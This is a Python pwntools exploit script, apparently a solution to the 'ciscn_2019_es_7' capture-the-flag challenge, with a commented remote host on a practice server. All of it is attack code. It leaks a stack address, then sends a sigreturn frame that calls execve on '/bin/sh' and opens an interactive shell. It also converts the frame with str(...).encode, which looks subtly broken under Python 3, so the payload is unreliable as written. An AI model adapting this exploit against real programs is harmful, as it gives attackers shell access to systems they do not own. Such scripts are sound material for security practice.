from pwn import *
from LibcSearcher import *
#context.arch='amd64'
context(os='linux',arch='amd64',log_level='debug')

p=process('./ciscn_2019_es_7')
#p=remote('node4.buuoj.cn',29603)

syscall_ret=0x400517
sigreturn_addr=0x4004da
system_addr=0x4004E2	

rax=0x4004f1

p.send(b'/bin/sh'+b'\x00'*9+p64(rax))
p.recv(32)
stack_addr=u64(p.recv(8))
log.success("stack: "+hex(stack_addr))
p.recv(8)

#gdb.attach(p)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr - 0x118 -0x30 
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

p.send(b'/bin/sh'+b'\x00'*(0x1+0x8)+p64(sigreturn_addr)+p64(syscall_ret)+str(sigframe).encode("utf-8"))

p.interactive()
